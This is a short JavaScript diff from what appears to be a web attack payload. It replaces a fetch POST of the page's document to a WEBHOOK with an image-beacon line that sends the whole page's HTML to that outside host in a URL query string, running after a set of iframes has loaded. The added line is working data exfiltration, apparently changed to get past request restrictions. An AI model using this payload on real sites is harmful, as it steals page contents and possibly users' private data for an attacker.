@@ -19,13 +19,9 @@ async function run(a = 1000, b = 1005) {
 
     await Promise.all(promises);
 
-    fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(document)
-    });
+    new Image().src = WEBHOOK + "?data=" + encodeURIComponent(document.documentElement.outerHTML);
 
-    console.log("fetch executed after all iframes loaded");
+    console.log("img executed after all iframes loaded");
 }
 
 run();
